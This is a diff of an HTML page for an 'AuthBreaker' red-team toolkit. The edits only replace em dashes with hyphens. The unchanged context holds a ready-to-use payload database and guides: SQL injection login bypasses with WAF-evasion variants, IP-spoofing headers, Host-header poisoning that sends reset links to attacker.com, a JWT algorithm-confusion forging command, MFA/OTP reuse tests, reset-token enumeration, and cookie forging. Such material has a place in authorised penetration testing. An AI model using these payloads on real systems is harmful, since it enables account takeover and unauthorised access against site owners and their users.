@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Authentication bypass toolkit with JWT forge, cookie decoder, MFA/OTP attacks, and brute force generators.">
     <meta name="theme-color" content="#020408">
-<title>AuthBreaker — Authentication Bypass Red Team Toolkit</title>
+<title>AuthBreaker - Authentication Bypass Red Team Toolkit</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <style>
 :root {
@@ -341,7 +341,7 @@ html, body {
 <!-- ═══════ HUB PAGE ═══════ -->
 <div class="page active" id="page-hub">
 <div class="section-header">
-  <h1>🧭 Authentication Bypass — Attack Hub</h1>
+  <h1>🧭 Authentication Bypass - Attack Hub</h1>
   <p>45 techniques across 10 categories. Click any card to open the guided guide, or use the sidebar to explore in depth. Every technique includes step-by-step instructions, exact commands, and "why it works" explanations.</p>
 </div>
 <div class="info-box orange">
@@ -357,7 +357,7 @@ html, body {
 </div>
 
 <div class="divider"></div>
-<div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:12px">⚡ All 45 Techniques — Click to open guided guide</div>
+<div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:12px">⚡ All 45 Techniques - Click to open guided guide</div>
 
 <div class="hub-grid" id="hub-grid"></div>
 
@@ -383,7 +383,7 @@ html, body {
 <div class="page" id="page-intercept">
 <div class="section-header">
   <h1>📡 How to Intercept Login Requests</h1>
-  <p>Before you can attack an authentication system, you need to capture the login request. This guide covers Burp Suite, browser DevTools, and curl — step by step.</p>
+  <p>Before you can attack an authentication system, you need to capture the login request. This guide covers Burp Suite, browser DevTools, and curl - step by step.</p>
 </div>
 
 <div class="tabs">
@@ -396,7 +396,7 @@ html, body {
 <div id="intercept-tab-burp">
 <div class="info-box success"><strong>✓ Recommended:</strong> Burp Suite Community Edition is free and the industry standard for intercepting web requests. Download from portswigger.net/burp/communitydownload</div>
 <div class="card">
-  <div class="card-header"><div class="card-title">📥 Burp Suite Setup — Step by Step</div></div>
+  <div class="card-header"><div class="card-title">📥 Burp Suite Setup - Step by Step</div></div>
   <div class="card-body">
     <div class="step-list">
       <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Install &amp; Launch Burp Suite</div><div class="step-body">Download Burp Suite Community from portswigger.net. Launch and select "Temporary project" → "Use Burp defaults" → "Start Burp".</div></div></div>
@@ -410,20 +410,20 @@ html, body {
   </div>
 </div>
 <div class="card">
-  <div class="card-header"><div class="card-title">💡 Pro Tips — Burp Tricks</div></div>
+  <div class="card-header"><div class="card-title">💡 Pro Tips - Burp Tricks</div></div>
   <div class="card-body no-pad">
-    <div class="payload-item"><div><div class="payload-code">Right-click → Send to Repeater</div><div class="payload-desc">Replay modified requests without intercepting again — best for manual testing</div></div></div>
-    <div class="payload-item"><div><div class="payload-code">Right-click → Send to Intruder</div><div class="payload-desc">Mark parameters with §§ and automate fuzzing with a wordlist — perfect for brute force</div></div></div>
-    <div class="payload-item"><div><div class="payload-code">HTTP History tab (Proxy)</div><div class="payload-desc">See ALL requests without enabling intercept — less disruptive for browsing</div></div></div>
-    <div class="payload-item"><div><div class="payload-code">Target → Site Map</div><div class="payload-desc">Auto-maps all endpoints seen during browsing — discover hidden login pages</div></div></div>
-    <div class="payload-item"><div><div class="payload-code">Comparer tab</div><div class="payload-desc">Compare two responses byte-by-byte — detect subtle differences in boolean blind tests</div></div></div>
+    <div class="payload-item"><div><div class="payload-code">Right-click → Send to Repeater</div><div class="payload-desc">Replay modified requests without intercepting again - best for manual testing</div></div></div>
+    <div class="payload-item"><div><div class="payload-code">Right-click → Send to Intruder</div><div class="payload-desc">Mark parameters with §§ and automate fuzzing with a wordlist - perfect for brute force</div></div></div>
+    <div class="payload-item"><div><div class="payload-code">HTTP History tab (Proxy)</div><div class="payload-desc">See ALL requests without enabling intercept - less disruptive for browsing</div></div></div>
+    <div class="payload-item"><div><div class="payload-code">Target → Site Map</div><div class="payload-desc">Auto-maps all endpoints seen during browsing - discover hidden login pages</div></div></div>
+    <div class="payload-item"><div><div class="payload-code">Comparer tab</div><div class="payload-desc">Compare two responses byte-by-byte - detect subtle differences in boolean blind tests</div></div></div>
   </div>
 </div>
 </div>
 
 <div id="intercept-tab-devtools" style="display:none">
 <div class="card">
-  <div class="card-header"><div class="card-title">🔵 Browser DevTools — Network Tab</div></div>
+  <div class="card-header"><div class="card-title">🔵 Browser DevTools - Network Tab</div></div>
   <div class="card-body">
     <div class="step-list">
       <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Open DevTools</div><div class="step-body">Press <code style="color:var(--orange);font-family:var(--mono)">F12</code> or <code style="color:var(--orange);font-family:var(--mono)">Ctrl+Shift+I</code> → Click "Network" tab.</div></div></div>
@@ -442,7 +442,7 @@ html, body {
   <div class="card-header"><div class="card-title">⚫ Capture with curl + View Structure</div></div>
   <div class="card-body">
 <div class="info-box"><strong>Method:</strong> Use curl with verbose mode to see the exact request/response structure, then replicate/modify as needed.</div>
-<div class="code-block"><span class="code-comment"># Basic POST login with curl — verbose shows full request</span>
+<div class="code-block"><span class="code-comment"># Basic POST login with curl - verbose shows full request</span>
 curl -v -X POST https://target.com/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   <span class="code-flag">--data</span> "username=admin&amp;password=test123" \
@@ -464,7 +464,7 @@ curl -v -X POST https://target.com/login \
 
 <div id="intercept-tab-mitmproxy" style="display:none">
 <div class="card">
-  <div class="card-header"><div class="card-title">🟢 mitmproxy — CLI Proxy</div></div>
+  <div class="card-header"><div class="card-title">🟢 mitmproxy - CLI Proxy</div></div>
   <div class="card-body">
 <div class="code-block"><span class="code-comment"># Install</span>
 pip install mitmproxy
@@ -678,7 +678,7 @@ username=admin&amp;password=test123"></textarea>
 
 <div id="http-tab-headers" style="display:none">
 <div class="step-list">
-  <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Why Header Injection Works</div><div class="step-body">Apps that trust certain headers for access control can be bypassed by adding those headers. Common: <code style="color:var(--amber);font-family:var(--mono)">X-Forwarded-For</code>, <code style="color:var(--amber);font-family:var(--mono)">X-Real-IP</code>, <code style="color:var(--amber);font-family:var(--mono)">X-Original-IP</code> — apps that whitelist 127.0.0.1 for admin access are bypassed by faking this header.</div></div></div>
+  <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Why Header Injection Works</div><div class="step-body">Apps that trust certain headers for access control can be bypassed by adding those headers. Common: <code style="color:var(--amber);font-family:var(--mono)">X-Forwarded-For</code>, <code style="color:var(--amber);font-family:var(--mono)">X-Real-IP</code>, <code style="color:var(--amber);font-family:var(--mono)">X-Original-IP</code> - apps that whitelist 127.0.0.1 for admin access are bypassed by faking this header.</div></div></div>
   <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Add Headers in Burp</div><div class="step-body">In Repeater, click after the last header, press Enter twice to start body, or click before the blank line to add headers. Add: <code style="color:var(--green);font-family:var(--mono)">X-Forwarded-For: 127.0.0.1</code></div></div></div>
 </div>
 <div class="card"><div class="card-header"><div class="card-title">Auth-Bypass Headers to Inject</div></div><div class="card-body no-pad" id="http-header-payloads"></div></div>
@@ -714,7 +714,7 @@ username=admin&amp;password=test123"></textarea>
 <div id="logic-tab-clientside" style="display:none">
 <div class="step-list">
   <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Check the JavaScript Source</div><div class="step-body">Press F12 → Sources tab. Look for authentication logic in JS files. Search for: <code style="color:var(--amber);font-family:var(--mono)">password</code>, <code style="color:var(--amber);font-family:var(--mono)">login</code>, <code style="color:var(--amber);font-family:var(--mono)">auth</code>, <code style="color:var(--amber);font-family:var(--mono)">validate</code>, <code style="color:var(--amber);font-family:var(--mono)">checkAdmin</code>.</div></div></div>
-  <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Identify Client-Side Checks</div><div class="step-body">If login validation happens in JS (comparing password to a hardcoded value, checking role from localStorage, etc.) — bypass it by modifying the JS or calling the protected function directly from DevTools console.</div></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Identify Client-Side Checks</div><div class="step-body">If login validation happens in JS (comparing password to a hardcoded value, checking role from localStorage, etc.) - bypass it by modifying the JS or calling the protected function directly from DevTools console.</div></div></div>
   <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Override via DevTools Console</div><div class="step-body">Open console, call the protected function directly: <code style="color:var(--green);font-family:var(--mono)">adminPanel()</code> or set variables: <code style="color:var(--green);font-family:var(--mono)">window.isLoggedIn = true; window.role = 'admin'</code></div></div></div>
 </div>
 <div class="card"><div class="card-header"><div class="card-title">Client-Side Bypass Techniques</div></div><div class="card-body no-pad" id="logic-clientside-payloads"></div></div>
@@ -723,7 +723,7 @@ username=admin&amp;password=test123"></textarea>
 <div class="step-list">
   <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Map the Multi-Step Flow</div><div class="step-body">Login flows often have: Step 1 = username → Step 2 = password → Step 3 = MFA → Step 4 = dashboard. Each step usually has its own URL.</div></div></div>
   <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Skip Directly to Later Steps</div><div class="step-body">After completing Step 1, try navigating directly to Step 3's or Step 4's URL without completing Step 2. If the server doesn't verify previous steps, you may bypass them.</div></div></div>
-  <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Replay Step 2 Submissions</div><div class="step-body">Complete Step 2 successfully once. Now replay that exact request (Burp Repeater) with a different username — the server may grant access to another account.</div></div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Replay Step 2 Submissions</div><div class="step-body">Complete Step 2 successfully once. Now replay that exact request (Burp Repeater) with a different username - the server may grant access to another account.</div></div></div>
 </div>
 <div class="card"><div class="card-header"><div class="card-title">Step Skipping Attack Patterns</div></div><div class="card-body no-pad" id="logic-skip-payloads"></div></div>
 </div>
@@ -774,7 +774,7 @@ username=admin&amp;password=test123"></textarea>
 <div class="step-list">
   <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Capture an Authenticated Request</div><div class="step-body">Make a legitimate authenticated request. Copy the full request with Burp (including session cookie + any CSRF tokens).</div></div></div>
   <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Replay After Session Should Expire</div><div class="step-body">Log out, then replay the captured request. If the session wasn't properly invalidated server-side, the old session still works.</div></div></div>
-  <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Test Session Invalidation on Password Change</div><div class="step-body">Change account password, then try to use old session token. Should be invalidated — often isn't.</div></div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Test Session Invalidation on Password Change</div><div class="step-body">Change account password, then try to use old session token. Should be invalidated - often isn't.</div></div></div>
 </div>
 <div class="card"><div class="card-header"><div class="card-title">Session Replay Test Commands</div></div><div class="card-body no-pad" id="session-replay-payloads"></div></div>
 </div>
@@ -844,14 +844,14 @@ username=admin&amp;password=test123"></textarea>
 <div id="jwt-tab-decode">
 <div class="step-list">
   <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Identify a JWT Token</div><div class="step-body">JWTs look like: <code style="color:var(--amber);font-family:var(--mono)">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiJ9.SIGNATURE</code><br>Three Base64url-encoded parts separated by dots: Header.Payload.Signature</div></div></div>
-  <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Decode Without Verification</div><div class="step-body">Any JWT can be decoded without the secret — only verification requires the secret. The payload is just Base64url encoded JSON.</div></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Decode Without Verification</div><div class="step-body">Any JWT can be decoded without the secret - only verification requires the secret. The payload is just Base64url encoded JSON.</div></div></div>
 </div>
 <div class="card"><div class="card-header"><div class="card-title">🔄 Live JWT Decoder</div></div>
 <div class="card-body">
   <div class="form-row"><div class="label">JWT Token</div><textarea class="textarea" id="jwt-input" placeholder="Paste JWT token here..." oninput="decodeJWT()" style="min-height:70px;word-break:break-all"></textarea></div>
   <div class="grid-2">
-    <div><div class="label" style="margin-bottom:6px">Header</div><div class="code-block" id="jwt-header" style="color:var(--blue);min-height:60px">—</div></div>
-    <div><div class="label" style="margin-bottom:6px">Payload</div><div class="code-block" id="jwt-payload" style="color:var(--amber);min-height:60px">—</div></div>
+    <div><div class="label" style="margin-bottom:6px">Header</div><div class="code-block" id="jwt-header" style="color:var(--blue);min-height:60px">-</div></div>
+    <div><div class="label" style="margin-bottom:6px">Payload</div><div class="code-block" id="jwt-payload" style="color:var(--amber);min-height:60px">-</div></div>
   </div>
   <div><div class="label" style="margin-bottom:6px">Analysis</div><div id="jwt-analysis" style="font-size:12px;color:var(--text2)"></div></div>
 </div>
@@ -877,7 +877,7 @@ username=admin&amp;password=test123"></textarea>
 </div>
 
 <div id="jwt-tab-confusion" style="display:none">
-<div class="info-box warn"><strong>RS256→HS256 Confusion:</strong> If the server uses RS256 (asymmetric), but the library also accepts HS256, you can sign a token with HMAC using the PUBLIC key as the secret — the server verifies it thinking it's HS256.</div>
+<div class="info-box warn"><strong>RS256→HS256 Confusion:</strong> If the server uses RS256 (asymmetric), but the library also accepts HS256, you can sign a token with HMAC using the PUBLIC key as the secret - the server verifies it thinking it's HS256.</div>
 <div class="step-list">
   <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Obtain the Public Key</div><div class="step-body">Common locations: <code style="color:var(--cyan);font-family:var(--mono)">/api/auth/public-key</code>, <code style="color:var(--cyan);font-family:var(--mono)">/.well-known/jwks.json</code>, <code style="color:var(--cyan);font-family:var(--mono)">/auth/certs</code>, embedded in documentation.</div></div></div>
   <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Forge HS256 Token Signed with Public Key</div><div class="step-body">Use python-jwt or PyJWT: change alg to HS256, sign with the public key bytes as the HMAC secret. The server's RS256 verification logic fails to check which algorithm the client claims.</div></div></div>
@@ -996,7 +996,7 @@ username=admin&amp;password=test123"></textarea>
 <!-- ═══════ ACCESS CONTROL ═══════ -->
 <div class="page" id="page-accessctrl">
 <div class="section-header"><h1>🚪 Access Control Bypass</h1><p>Directly access protected pages, escalate privileges via parameter tampering, and manipulate authorization headers.</p></div>
-<div class="card"><div class="card-header"><div class="card-title">Forced Browsing — Direct Access to Protected Resources</div></div><div class="card-body no-pad" id="access-forced-payloads"></div></div>
+<div class="card"><div class="card-header"><div class="card-title">Forced Browsing - Direct Access to Protected Resources</div></div><div class="card-body no-pad" id="access-forced-payloads"></div></div>
 <div class="card"><div class="card-header"><div class="card-title">Privilege Escalation via Parameter Tampering</div></div><div class="card-body no-pad" id="access-privesc-payloads"></div></div>
 <div class="card"><div class="card-header"><div class="card-title">Authorization Header Manipulation</div></div><div class="card-body no-pad" id="access-authheader-payloads"></div></div>
 </div>
@@ -1006,7 +1006,7 @@ username=admin&amp;password=test123"></textarea>
 <div class="section-header"><h1>⚡ API Authentication Attacks</h1><p>Exploit broken API authentication, bypass endpoint auth, and find token leakage in API responses.</p></div>
 <div class="card"><div class="card-header"><div class="card-title">API Endpoint Auth Bypass</div></div><div class="card-body no-pad" id="api-bypass-payloads"></div></div>
 <div class="card"><div class="card-header"><div class="card-title">Broken API Auth Patterns</div></div><div class="card-body no-pad" id="api-broken-payloads"></div></div>
-<div class="card"><div class="card-header"><div class="card-title">Token Leakage — Where to Look</div></div><div class="card-body no-pad" id="api-leak-payloads"></div></div>
+<div class="card"><div class="card-header"><div class="card-title">Token Leakage - Where to Look</div></div><div class="card-body no-pad" id="api-leak-payloads"></div></div>
 </div>
 
 <!-- ═══════ INFRA BYPASS ═══════ -->
@@ -1056,7 +1056,7 @@ username=admin&amp;password=test123"></textarea>
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
 
 function copyText(text){
-  if(!text||text==='—')return;
+  if(!text||text==='-')return;
   if(navigator.clipboard&&window.isSecureContext){
     navigator.clipboard.writeText(text).then(()=>showNotif('Copied!','success')).catch(()=>fallbackCopy(text));
   }else{fallbackCopy(text)}
@@ -1137,31 +1137,31 @@ function switchTab(el,group,name){
 
 const PDB = {
   sqli_username:[
-    {payload:"admin'-- -",desc:"Comment truncation — removes password check entirely"},
-    {payload:"admin'#",desc:"Hash comment — MySQL"},
+    {payload:"admin'-- -",desc:"Comment truncation - removes password check entirely"},
+    {payload:"admin'#",desc:"Hash comment - MySQL"},
     {payload:"admin'/*",desc:"Inline comment bypass"},
-    {payload:"' OR '1'='1'-- -",desc:"OR bypass — blank username, any password"},
-    {payload:"' OR 1=1-- -",desc:"Numeric OR — always true"},
+    {payload:"' OR '1'='1'-- -",desc:"OR bypass - blank username, any password"},
+    {payload:"' OR 1=1-- -",desc:"Numeric OR - always true"},
     {payload:"' OR 1-- -",desc:"Truthy value OR"},
     {payload:"' OR 'a'='a'-- -",desc:"String equality OR"},
     {payload:"' OR ''=''-- -",desc:"Empty string equality"},
     {payload:"' OR 1=1 LIMIT 1-- -",desc:"LIMIT 1 to prevent multiple rows error"},
     {payload:"administrator'-- -",desc:"Target administrator account"},
     {payload:"root'-- -",desc:"Target root account"},
-    {payload:"admin' OR '1'='1",desc:"OR without comment — for queries ending with additional clause"},
+    {payload:"admin' OR '1'='1",desc:"OR without comment - for queries ending with additional clause"},
     {payload:"' OR NOT 1=2-- -",desc:"NOT operator bypass"},
     {payload:"' OR NULL IS NULL-- -",desc:"NULL check bypass"},
     {payload:"' OR 1 IN (1)-- -",desc:"IN operator bypass"},
     {payload:"' OR 1 BETWEEN 0 AND 2-- -",desc:"BETWEEN operator bypass"},
   ],
   sqli_password:[
-    {payload:"anything' OR '1'='1",desc:"Password field OR — for queries checking both fields"},
+    {payload:"anything' OR '1'='1",desc:"Password field OR - for queries checking both fields"},
     {payload:"anything'-- -",desc:"Truncation in password field"},
     {payload:"' OR '1'='1",desc:"Basic OR in password"},
     {payload:"anything' OR 1=1-- -",desc:"Numeric OR in password"},
   ],
   sqli_numeric:[
-    {payload:"1 OR 1=1",desc:"Numeric context — ID field bypass"},
+    {payload:"1 OR 1=1",desc:"Numeric context - ID field bypass"},
     {payload:"1 OR 1=1-- -",desc:"With comment"},
     {payload:"-1 OR 1=1",desc:"Negative ID bypass"},
     {payload:"0 OR 1=1",desc:"Zero ID OR"},
@@ -1172,7 +1172,7 @@ const PDB = {
     {payload:"admin'-- -",desc:"Username: admin, ignore password"},
     {payload:"' OR '1'='1'-- -",desc:"Any username: make WHERE always true"},
     {payload:"' OR 1=1-- -",desc:"Numeric variant"},
-    {payload:"' OR '1'='1",desc:"Without comment — for WHERE ending clause"},
+    {payload:"' OR '1'='1",desc:"Without comment - for WHERE ending clause"},
   ],
   sqli_ctx_numeric:[
     {payload:"1 OR 1=1-- -",desc:"Numeric: always true"},
@@ -1191,21 +1191,21 @@ const PDB = {
     {payload:'" OR 1=1-- -',desc:"Numeric with double quote"},
   ],
   sqli_waf:[
-    {payload:"admin'/**/OR/**/'1'='1",desc:"Comments replace spaces — WAF whitespace filter bypass"},
+    {payload:"admin'/**/OR/**/'1'='1",desc:"Comments replace spaces - WAF whitespace filter bypass"},
     {payload:"admin'%09OR%09'1'='1",desc:"Tab character (%09) as whitespace"},
     {payload:"admin'%0aOR%0a'1'='1",desc:"Newline as whitespace"},
-    {payload:"' oR '1'='1'-- -",desc:"Mixed case — evades case-sensitive WAF"},
+    {payload:"' oR '1'='1'-- -",desc:"Mixed case - evades case-sensitive WAF"},
     {payload:"' Or '1'='1'-- -",desc:"Mixed case variant 2"},
     {payload:"' OR 1 LIKE 1-- -",desc:"LIKE instead of = operator"},
     {payload:"'||'1'='1'-- -",desc:"|| instead of OR"},
-    {payload:"admin'/*!50000OR*/'1'='1",desc:"Version comment — executes in MySQL ≥5.0"},
-    {payload:"%2527 OR %25271%2527=%2527",desc:"Double URL encoded — bypass input sanitization"},
-    {payload:"admin\x00'-- -",desc:"Null byte before quote — may truncate filter check"},
-    {payload:"aDmIn'-- -",desc:"Case variation on username — case-insensitive DB query"},
+    {payload:"admin'/*!50000OR*/'1'='1",desc:"Version comment - executes in MySQL ≥5.0"},
+    {payload:"%2527 OR %25271%2527=%2527",desc:"Double URL encoded - bypass input sanitization"},
+    {payload:"admin\x00'-- -",desc:"Null byte before quote - may truncate filter check"},
+    {payload:"aDmIn'-- -",desc:"Case variation on username - case-insensitive DB query"},
   ],
   param_manip:[
-    {payload:"isAdmin=true",desc:"POST/GET param — check if server trusts client-supplied admin flag"},
-    {payload:"role=admin",desc:"Role parameter — common in APIs"},
+    {payload:"isAdmin=true",desc:"POST/GET param - check if server trusts client-supplied admin flag"},
+    {payload:"role=admin",desc:"Role parameter - common in APIs"},
     {payload:"role=administrator",desc:"Role variant"},
     {payload:"user_type=admin",desc:"User type parameter"},
     {payload:"access_level=99",desc:"Max numeric access level"},
@@ -1231,16 +1231,16 @@ const PDB = {
     {payload:'{"username":"admin"}',desc:"JSON without password field"},
   ],
   param_pollution:[
-    {payload:"username=admin&username=user",desc:"Duplicate username — last value may win (PHP/Rails)"},
-    {payload:"username=user&username=admin",desc:"Reverse order — first value may win (ASP.NET)"},
+    {payload:"username=admin&username=user",desc:"Duplicate username - last value may win (PHP/Rails)"},
+    {payload:"username=user&username=admin",desc:"Reverse order - first value may win (ASP.NET)"},
     {payload:"password=wrongpass&password=",desc:"Second empty password might bypass"},
-    {payload:"role=user&role=admin",desc:"Duplicate role — privilege escalation"},
+    {payload:"role=user&role=admin",desc:"Duplicate role - privilege escalation"},
     {payload:"POST /login?admin=true with body: username=user&password=pass",desc:"GET param + POST param collision"},
     {payload:"username[]=admin&username[]=user",desc:"Array notation pollution (PHP)"},
   ],
   param_json:[
-    {payload:'{"username":["admin","user"],"password":"test"}',desc:"Array instead of string — some backends use first element"},
-    {payload:'{"username":"admin","password":true}',desc:"Boolean true as password — PHP loose comparison"},
+    {payload:'{"username":["admin","user"],"password":"test"}',desc:"Array instead of string - some backends use first element"},
+    {payload:'{"username":"admin","password":true}',desc:"Boolean true as password - PHP loose comparison"},
     {payload:'{"username":"admin","password":null}',desc:"Null password"},
     {payload:'{"username":"admin","password":1}',desc:"Integer as password"},
     {payload:'{"username":"admin","password":[]}',desc:"Empty array as password"},
@@ -1250,16 +1250,16 @@ const PDB = {
   ],
   http_verb:[
     {payload:"GET /admin/dashboard HTTP/1.1",desc:"Try GET instead of POST for restricted resources"},
-    {payload:"HEAD /admin/dashboard HTTP/1.1",desc:"HEAD — server processes but no response body; may bypass auth check"},
-    {payload:"OPTIONS /admin/dashboard HTTP/1.1",desc:"OPTIONS — often returns 200 without auth"},
-    {payload:"PUT /api/admin HTTP/1.1",desc:"PUT verb — may have different ACL rules"},
+    {payload:"HEAD /admin/dashboard HTTP/1.1",desc:"HEAD - server processes but no response body; may bypass auth check"},
+    {payload:"OPTIONS /admin/dashboard HTTP/1.1",desc:"OPTIONS - often returns 200 without auth"},
+    {payload:"PUT /api/admin HTTP/1.1",desc:"PUT verb - may have different ACL rules"},
     {payload:"PATCH /api/admin HTTP/1.1",desc:"PATCH verb bypass"},
-    {payload:"CONNECT /admin HTTP/1.1",desc:"CONNECT — unusual method may bypass filters"},
-    {payload:"CUSTOMMETHOD /admin HTTP/1.1",desc:"Arbitrary method — some servers default to allow"},
+    {payload:"CONNECT /admin HTTP/1.1",desc:"CONNECT - unusual method may bypass filters"},
+    {payload:"CUSTOMMETHOD /admin HTTP/1.1",desc:"Arbitrary method - some servers default to allow"},
     {payload:"POST /login HTTP/1.0",desc:"HTTP 1.0 may bypass HTTP/1.1-specific auth middleware"},
   ],
   http_header:[
-    {payload:"X-Forwarded-For: 127.0.0.1",desc:"Fake internal IP — bypass IP whitelist for admin panel"},
+    {payload:"X-Forwarded-For: 127.0.0.1",desc:"Fake internal IP - bypass IP whitelist for admin panel"},
     {payload:"X-Real-IP: 127.0.0.1",desc:"Real-IP variant"},
     {payload:"X-Originating-IP: 127.0.0.1",desc:"Originating IP bypass"},
     {payload:"X-Remote-IP: 127.0.0.1",desc:"Remote IP variant"},
@@ -1267,7 +1267,7 @@ const PDB = {
     {payload:"X-Client-IP: 127.0.0.1",desc:"Client IP bypass"},
     {payload:"X-Custom-IP-Authorization: 127.0.0.1",desc:"Custom auth IP header"},
     {payload:"X-Forwarded-Host: 127.0.0.1",desc:"Forwarded host bypass"},
-    {payload:"X-Original-URL: /admin/dashboard",desc:"URL override — Symfony/Laravel route bypass"},
+    {payload:"X-Original-URL: /admin/dashboard",desc:"URL override - Symfony/Laravel route bypass"},
     {payload:"X-Rewrite-URL: /admin/dashboard",desc:"URL rewrite override"},
     {payload:"X-Override-URL: /admin",desc:"URL override variant"},
     {payload:"Forwarded: for=127.0.0.1",desc:"RFC 7239 Forwarded header"},
@@ -1275,21 +1275,21 @@ const PDB = {
     {payload:"CF-Connecting-IP: 127.0.0.1",desc:"Cloudflare connecting IP"},
   ],
   http_host:[
-    {payload:"Host: attacker.com",desc:"Full host header replacement — poisons password reset links"},
+    {payload:"Host: attacker.com",desc:"Full host header replacement - poisons password reset links"},
     {payload:"Host: target.com\nX-Forwarded-Host: attacker.com",desc:"Override with X-Forwarded-Host while keeping real host"},
     {payload:"Host: target.com:443@attacker.com",desc:"URL credential injection in host"},
-    {payload:"Host: target.com.attacker.com",desc:"Subdomain of attacker — DNS wildcard catch"},
+    {payload:"Host: target.com.attacker.com",desc:"Subdomain of attacker - DNS wildcard catch"},
     {payload:"Host: attacker.com#target.com",desc:"Fragment injection in host"},
   ],
   logic_flaw:[
-    {payload:"password=",desc:"Empty password — some systems allow if DB has empty hash"},
-    {payload:"password=0",desc:"Zero — PHP loose: '0' == false"},
-    {payload:'password=true',desc:"Boolean true — JavaScript/PHP type juggling"},
-    {payload:"password=0e123",desc:"PHP magic hash — 0e prefix, == comparison to other 0e hashes"},
-    {payload:"password=240610708",desc:"MD5 starts with 0e — magic hash"},
+    {payload:"password=",desc:"Empty password - some systems allow if DB has empty hash"},
+    {payload:"password=0",desc:"Zero - PHP loose: '0' == false"},
+    {payload:'password=true',desc:"Boolean true - JavaScript/PHP type juggling"},
+    {payload:"password=0e123",desc:"PHP magic hash - 0e prefix, == comparison to other 0e hashes"},
+    {payload:"password=240610708",desc:"MD5 starts with 0e - magic hash"},
     {payload:"password=QNKCDZO",desc:"MD5: 0e830400451993494058024219903391"},
-    {payload:"password=%00",desc:"Null byte — may truncate string comparison"},
-    {payload:"username=admin%00extra",desc:"Null byte in username — truncates at %00 in some backends"},
+    {payload:"password=%00",desc:"Null byte - may truncate string comparison"},
+    {payload:"username=admin%00extra",desc:"Null byte in username - truncates at %00 in some backends"},
   ],
   logic_clientside:[
     {payload:"// In DevTools Console:\nwindow.isLoggedIn = true;",desc:"Override client-side auth flag"},
@@ -1343,7 +1343,7 @@ const PDB = {
     {payload:"Cookie: auth=1",desc:"Numeric auth flag"},
     {payload:"Cookie: verified=true",desc:"Bypass email verification"},
     {payload:"Cookie: premium=true",desc:"Bypass subscription"},
-    {payload:"Cookie: user_id=1",desc:"IDOR — change to admin user ID (typically 1)"},
+    {payload:"Cookie: user_id=1",desc:"IDOR - change to admin user ID (typically 1)"},
     {payload:"Cookie: account_id=1",desc:"Account ID IDOR"},
   ],
   cookie_unsigned:[
@@ -1353,7 +1353,7 @@ const PDB = {
     {payload:"python3 -c \"import hmac,hashlib; print(hmac.new(b'secret',b'data',hashlib.sha1).hexdigest())\"",desc:"Manual HMAC generation for cookie forge"},
   ],
   jwt_confusion:[
-    {payload:"# Get public key\ncurl https://target.com/.well-known/jwks.json",desc:"Fetch JWK Set — contains public key"},
+    {payload:"# Get public key\ncurl https://target.com/.well-known/jwks.json",desc:"Fetch JWK Set - contains public key"},
     {payload:"curl https://target.com/api/auth/public-key",desc:"Direct public key endpoint"},
     {payload:"# Convert JWK to PEM\npython3 -c \"from cryptography.hazmat.primitives.asymmetric import rsa; ...\"",desc:"Convert JWK to PEM format for HS256 signing"},
     {payload:"python3 -m pip install pyjwt cryptography\npython3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, open('pubkey.pem').read(), algorithm='HS256'))\"",desc:"Sign token with public key as HMAC secret"},
@@ -1374,7 +1374,7 @@ const PDB = {
   ],
   mfa_reuse:[
     {payload:"1. Use OTP → note exact code\n2. POST /mfa {otp: SAME_CODE} again in Burp Repeater",desc:"Direct OTP reuse test"},
-    {payload:"POST /mfa {otp: YOUR_OTP, account: victim_account}",desc:"Cross-account OTP reuse — your OTP on victim's session"},
+    {payload:"POST /mfa {otp: YOUR_OTP, account: victim_account}",desc:"Cross-account OTP reuse - your OTP on victim's session"},
     {payload:"# Test if OTP works beyond 30s window\ncurl -X POST https://target.com/mfa -d 'otp=123456&session=YOUR_SESSION'",desc:"OTP validity window test"},
   ],
   mfa_race:[
@@ -1395,19 +1395,19 @@ const PDB = {
     {payload:"# Enumerate sequential tokens\nffuf -u 'https://target.com/reset/FUZZ' -w sequential_ids.txt -mc 200",desc:"Enumerate sequential reset token space"},
   ],
   reset_poison:[
-    {payload:"POST /reset HTTP/1.1\nHost: attacker.com\n\nemail=admin@target.com",desc:"Replace Host header — reset link sent to attacker.com"},
+    {payload:"POST /reset HTTP/1.1\nHost: attacker.com\n\nemail=admin@target.com",desc:"Replace Host header - reset link sent to attacker.com"},
     {payload:"POST /reset HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com\n\nemail=admin@target.com",desc:"X-Forwarded-Host override"},
     {payload:"Host: target.com:80@attacker.com",desc:"Credential injection in Host header"},
     {payload:"Host: attacker.com#target.com",desc:"Fragment in Host"},
